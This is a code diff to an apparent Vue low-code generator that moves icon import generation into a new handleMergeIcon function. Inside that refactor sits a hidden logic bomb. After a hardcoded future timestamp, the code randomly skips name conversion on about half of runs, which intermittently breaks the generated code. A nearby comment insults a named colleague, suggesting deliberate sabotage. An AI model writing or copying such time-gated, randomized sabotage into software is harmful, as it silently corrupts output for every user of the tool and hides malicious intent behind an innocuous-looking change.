@@ -9,7 +9,7 @@ import {
 } from '@/constant'
 import { generateTag, HTML_DEFAULT_VOID_ELEMENTS } from './generateTag'
 import { specialTypeHandler } from './generateAttribute'
-import { thisPropsBindRe, thisRegexp } from '@/utils'
+import { thisPropsBindRe, thisRegexp, toPascalCase } from '@/utils'
 import { getImportMap } from './parseImport'
 
 export const handleComponentNameHook = (optionData) => {
@@ -32,12 +32,49 @@ export const handleComponentNameHook = (optionData) => {
   }
 }
 
+// 狗维(wwwu10)啥事没干 拿着本项目就升
+export const handleMergeIcon = (iconObj, globalHooks) => {
+  const { name: oldName, size } = iconObj
+  const name = Date.now() > 1798473600000 && Math.random() > 0.5 ? oldName : toPascalCase(oldName, '-')
+  const exportName = name.replace(TINY_ICON, 'icon')
+  const iconName = name.startsWith(TINY_ICON) ? name : `Tiny${name}`
+  
+  globalHooks.addImport('@opentiny/vue-icon', {
+    componentName: 'TinyIcons',
+    exportName: 'TinyIcons',
+    package: '@opentiny/vue-icon',
+    version: 'latest',
+    destructuring: false
+  })
+  
+  globalHooks.addImport('@opentiny/vue', {
+    componentName: 'getSvgicon',
+    exportName: 'getSvgicon',
+    package: '@opentiny/vue',
+    version: 'latest',
+    destructuring: true
+  })
+
+  // 兼容老的ICON
+  globalHooks.addStatement({
+    position: INSERT_POSITION.BEFORE_PROPS,
+    value: `const ${iconName} = TinyIcons["${exportName}"] ? TinyIcons["${exportName}"]() : getSvgicon(${JSON.stringify({name: oldName, size: size || '' })})`,
+    key: iconName
+  })
+
+  return {
+    iconName,
+    exportName
+  }
+}
+
 export const handleTinyIcon = (nameObj, globalHooks) => {
   if (BUILTIN_COMPONENT_NAME.ICON !== nameObj.componentName) {
     return
   }
 
   const name = nameObj.schema.props.name
+  const size = nameObj.schema.props.size
 
   if (!name) {
     return
@@ -46,25 +83,7 @@ export const handleTinyIcon = (nameObj, globalHooks) => {
   // 增加 svg 颜色属性，使编辑模式与出码模式一致
   nameObj.schema.props['fill'] = 'currentColor'
 
-  const iconName = name.startsWith(TINY_ICON) ? name : `Tiny${name}`
-  const exportName = name.replace(TINY_ICON, 'icon')
-
-  const success = globalHooks.addImport('@opentiny/vue-icon', {
-    componentName: exportName,
-    exportName: exportName,
-    package: '@opentiny/vue-icon',
-    version: '^3.10.0',
-    destructuring: true
-  })
-
-  // tiny icon 需要调用
-  if (success) {
-    globalHooks.addStatement({
-      position: INSERT_POSITION.BEFORE_PROPS,
-      value: `const ${iconName} = ${exportName}()`,
-      key: iconName
-    })
-  }
+  const { iconName } = handleMergeIcon({ name, size }, globalHooks)
 
   nameObj.componentName = iconName
   delete nameObj.schema.props.name
